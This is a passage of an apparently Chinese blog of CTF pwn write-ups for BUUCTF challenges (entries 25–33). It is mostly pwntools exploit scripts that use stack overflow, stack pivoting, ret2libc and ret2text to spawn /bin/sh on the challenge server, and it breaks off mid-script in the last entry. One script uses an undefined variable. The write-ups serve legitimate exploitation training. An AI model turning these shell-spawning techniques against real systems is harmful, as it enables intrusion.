<h2 id="25-jatviso-tell-me-something"><a href="#25-jatviso-tell-me-something" class="headerlink" title="25 jatviso_tell_me_something"></a>25 jatviso_tell_me_something</h2><p>这道题有一点小坑,一般都是将<code>ebp</code>压入栈，然后将<code>esp</code>的值赋值给<code>ebp</code>，然后<code>esp</code>减去对应的栈空间的大小</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push	ebp</span><br><span class="line">mov		ebp, esp</span><br><span class="line">sub		esp, 18h</span><br></pre></td></tr></table></figure>

<p>但是这道题直接将<code>rsp</code>减去0x88，这里并没有把<code>rbp</code>压入栈，所以只需要0x88大小就可以覆盖返回地址了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28402</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(<span class="number">0x400620</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="26-ciscn-2019-es-2"><a href="#26-ciscn-2019-es-2" class="headerlink" title="26 ciscn_2019_es_2"></a>26 ciscn_2019_es_2</h2><p>发现溢出只有八字节，需要栈迁移</p>
<p>我觉得这位师傅讲的不错，<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-269163.htm">ciscn_2019_es_2</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context.terminal = [<span class="string">&#x27;terminator&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25052</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./pwn&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">sys_addr=elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leave_ret=<span class="number">0x080484b8</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;name?\n&quot;</span>)</span><br><span class="line">payload1= <span class="number">0x20</span>*<span class="string">&quot;a&quot;</span>+<span class="string">&quot;b&quot;</span>*<span class="number">0x8</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(<span class="string">&quot;b&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">ebp_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;ebp:&#x27;</span>+<span class="built_in">hex</span>(ebp_addr))</span><br><span class="line"></span><br><span class="line">payload2 = (<span class="string">b&quot;aaaa&quot;</span>+p32(sys_addr)+<span class="string">b&#x27;aaaa&#x27;</span>+p32(ebp_addr-<span class="number">0x28</span>)+<span class="string">b&#x27;/bin/sh&#x27;</span>).ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p32(ebp_addr-<span class="number">0x38</span>) + p32(leave_ret)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h3><p><code>vul</code>函数看一下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20u</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30u</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到<code>read</code>大小为0x30，但是s变量和ebp的距离是0x28。八字节的溢出只够覆盖<code>ebp</code>和<code>ret</code>，不可以做到直接修改<code>hack</code>函数里system的参数。<strong>所以我们利用<code>leave_ret</code>挟持esp进行栈迁移</strong></p>
<p>若无限制，构造的栈长这样：</p>
<table>
<thead>
<tr>
<th></th>
<th>&#x2F;bin&#x2F;sh</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td>&#x2F;bin&#x2F;sh_addr</td>
</tr>
<tr>
<td></td>
<td>0xdeadbeef</td>
</tr>
<tr>
<td><strong>return</strong></td>
<td>system_addr</td>
</tr>
<tr>
<td><strong>ebp</strong></td>
<td>aaaa</td>
</tr>
<tr>
<td><strong>s</strong></td>
<td>垃圾数据</td>
</tr>
<tr>
<td><strong>esp</strong></td>
<td></td>
</tr>
</tbody></table>
<p>但是有限制，所以通过<code>leave</code>转移到别处，因此将<code>ebp</code>的内容改为<code>s</code>的地址，<code>return</code>改为<code>leave</code>的地址</p>
<p>执行两次leave之后栈的样子</p>
<table>
<thead>
<tr>
<th>return</th>
<th>leave_ret_addr</th>
</tr>
</thead>
<tbody><tr>
<td><strong>ebp</strong></td>
<td>s_addr</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td><strong>esp</strong></td>
<td></td>
</tr>
<tr>
<td><strong>s</strong></td>
<td>垃圾数据</td>
</tr>
</tbody></table>
<p>一般leave命令后面都会跟着ret命令，也是必须要有的。此处如果继续执行ret命令就会返回到esp所指向内容填写的地址，那么接下来就很好办了，我们构造栈的内容</p>
<table>
<thead>
<tr>
<th><strong>return</strong></th>
<th>leave_ret_addr</th>
</tr>
</thead>
<tbody><tr>
<td><strong>ebp</strong></td>
<td>aaaa</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td>&#x2F;bin&#x2F;sh</td>
</tr>
<tr>
<td></td>
<td>&#x2F;bin&#x2F;sh_addr</td>
</tr>
<tr>
<td></td>
<td>0xdeadbeef</td>
</tr>
<tr>
<td><strong>esp</strong></td>
<td>system_addr</td>
</tr>
<tr>
<td><strong>s</strong></td>
<td>垃圾数据</td>
</tr>
</tbody></table>
<p>当然此处我们还有一个问题就是’&#x2F;bin&#x2F;sh’的地址我们不知道。我们可以通过泄露原来ebp的值来确定，我们将此地址叫做addr，以免和ebp寄存器混淆</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">//	[esp+0h][ebp-28h]BYREF</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0x20u</span>);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x30u</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x30u</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到有一个printf函数</p>
<p>printf函数会打印s字符串，且遇到0就会停止打印，所以如果我们将addr之前的内容全部填充不为0的字符，就能将addr打印出来，我们通过地址再计算出addr到s的距离，我们就可以通过addr来表示<code>/bin/sh</code>所在的地址了。</p>
<p><strong>我们先通过第一个<code>read</code>传入<code>payload</code>，然后通过<code>printf</code>打印出<code>addr</code>的值,然后通过第二个<code>read</code>函数构造栈转移，执行<code>systeam(&#39;/bin/sh&#39;)</code></strong></p>
<h2 id="27-HarekazeCTF2019-baby-rop2"><a href="#27-HarekazeCTF2019-baby-rop2" class="headerlink" title="27 HarekazeCTF2019 baby_rop2"></a>27 HarekazeCTF2019 baby_rop2</h2><p>ret2libc，但是用<code>printf</code>输出<code>read</code>函数的地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25118</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_got=elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">printf_plt=elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">format_addr=<span class="number">0x400770</span>	<span class="comment"># 原本输出字符串的地址</span></span><br><span class="line">pop_rdi = <span class="number">0x400733</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x400731</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>	<span class="comment"># 设置溢出覆盖返回地址</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(format_addr)	<span class="comment"># pop_rdi弹入原本字符串</span></span><br><span class="line">payload+=p64(pop_rsi_r15)+p64(read_got)+p64(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># ret到pop_rsi_r15，将read的got表地址弹入rsi，随便一个东西弹入r15</span></span><br><span class="line">payload+=p64(printf_plt)+p64(main_addr)</span><br><span class="line"><span class="comment"># ret到printf的plt表地址，也就是调用plt，然后返回main</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;name?&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;!\n&#x27;</span>)</span><br><span class="line">read_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;read&quot;</span>,read_addr)</span><br><span class="line">libc_base=read_addr-libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">sys_addr=libc_base+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr=libc_base+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span>+p64(pop_rdi)+p64(binsh_addr)+p64(sys_addr)+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这道题远程直接<code>cat flag</code>不能用，先<code>find -name &quot;flag&quot;</code>找到flag放在了<code>./home/babyrop2/flag</code>里，再<code>cat</code></p>
<h2 id="28-picoctf-2018-rop-chain"><a href="#28-picoctf-2018-rop-chain" class="headerlink" title="28 picoctf_2018_rop chain"></a>28 picoctf_2018_rop chain</h2><p>很简单的溢出、改数据，拿flag</p>
<p>注意里面这一句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (win1 &amp;&amp; win2 &amp;&amp; a1 == -559039827)</span><br></pre></td></tr></table></figure>

<p>是<code>win1和win2</code>,<code>a1和-559039827</code>,得到的结果再<code>&amp;&amp;</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26736</span>)</span><br><span class="line">win1_addr = <span class="number">0x80485CB</span></span><br><span class="line">win2_addr = <span class="number">0x80485D8</span></span><br><span class="line">flag = <span class="number">0x804862B</span></span><br><span class="line">pop_ebp = <span class="number">0x80485d6</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span>+p32(win1_addr)+p32(win2_addr)+p32(flag)+p32(<span class="number">0xBAAAAAAD</span>)+p32</span><br><span class="line">(<span class="number">0xDEADBAAD</span>)</span><br><span class="line"><span class="comment"># 先返回到win1使得win1 = 1</span></span><br><span class="line"><span class="comment"># 然后返回win2，因为要与ebp+8比较，所以中间先加一个flag_addr</span></span><br><span class="line"><span class="comment"># 比较好了直接返回到flag_addr</span></span><br><span class="line"><span class="comment"># 然后与ebp+8进行比较，正好夹了一个0xBAAAAAAD</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="29-pwn2-sctf-2016"><a href="#29-pwn2-sctf-2016" class="headerlink" title="29 pwn2_sctf_2016"></a>29 pwn2_sctf_2016</h2><p>先输入一个负值就可以溢出了，跟正常<em><strong>libc</strong></em>没区别，<del>就是我的LibcSearcher没找到对应的libc，看网上师傅的博客有说选13，但是我的只显示到9</del></p>
<p><em>破案了，LibcSearcher会随机roll，看运气(有点过于艺术了)</em></p>
<p><em>roll了半个小时，靶机都过期了，算了，本地过了就行了，本地选5</em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;arm64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26858</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">start_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">r.recvuntil(<span class="string">&#x27;read?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;data!\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x2c</span>+<span class="number">4</span>) + p32(printf_plt) + p32(start_addr) + p32(printf_got)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">printf_addr=u32(r.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br><span class="line"></span><br><span class="line">libc_base = printf_addr-libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">system_addr = base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;read?&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;data!\n&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(system_addr)+p32(start_addr)+p32(bin_sh)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="30-jarvisoj-level3"><a href="#30-jarvisoj-level3" class="headerlink" title="30 jarvisoj_level3"></a>30 jarvisoj_level3</h2><p><em><strong>ret2libc</strong></em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc-2.19.so&quot;)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28662</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span>+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">0x4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">libc_base = write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">sys = libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span>+p32(sys)+p32(<span class="number">0</span>)+p32(binsh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="31-ciscn-2019-s-3"><a href="#31-ciscn-2019-s-3" class="headerlink" title="31 ciscn_2019_s_3"></a>31 ciscn_2019_s_3</h2><p>施工中……</p>
<h2 id="32-wustctf2020-getshell"><a href="#32-wustctf2020-getshell" class="headerlink" title="32 wustctf2020_getshell"></a>32 wustctf2020_getshell</h2><p><em><strong>ret2text</strong></em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25069</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x4</span>+p32(<span class="number">0x8048524</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="33-ez-pz-hackover-2016-动态调试入门"><a href="#33-ez-pz-hackover-2016-动态调试入门" class="headerlink" title="33 ez_pz_hackover_2016 (动态调试入门)"></a>33 ez_pz_hackover_2016 (动态调试入门)</h2><p>一道很好的<em><strong>动态调试</strong></em>入门题</p>
<p>检查保护</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/pwn/pwn/buuctf/33/pwn&#x27;</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<p>保护全关，有可读可写可执行段，可能是<code>shellcode</code></p>
<p>看下题目</p>
<p><img src="/./images/image-20250131225811634.png" alt="image-20250131225811634"></p>
<p><code>memchr</code>函数在网上搜索一下就好，这里不做详细介绍，主要是看到最后有一个比较，如果在<code>\n</code>之前为<code>crasheme</code>，则可以进入vuln函数</p>
<p><img src="/./images/image-20250131230108221.png" alt="image-20250131230108221"></p>
<p>明显的溢出漏洞，<code>dest</code>仅有0x32字节，但是可以读入0x400字节，往里面写入shellcode</p>
<p><strong>思路</strong></p>
<p>往s里写入shllcode，执行vuln函数后让dest溢出，将返回地址修改为shellcode的地址</p>
<p><strong>实施</strong></p>
<p>但是dest是栈上的数据，一般情况下我们是找不到我们写入的地址的，那就没办法执行shellcode的地址。</p>
<p>执行一次程序可以发现其实程序一开始就把我们输入的地址给我们了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Yippie, lets crash: %p\n&quot;</span>, s);</span><br></pre></td></tr></table></figure>

<p>那么我们算出shellcode和我们输入的起始位置的偏移，就可以得到shellcode的地址</p>
<p>先写一个测试脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = <span class="string">&#x27;wt.exe -d . wsl.exe -d Ubuntu&#x27;</span>.split()</span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x8048600&#x27;</span>)<span class="comment">#利用gdb动调，在0x8048600处下了个断点</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;crash: &#x27;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;crashme\x00&#x27;</span>+<span class="string">&#x27;aaaaaa&#x27;</span><span class="comment">#前面的crashme\x00绕过if判断</span></span><br><span class="line">      <span 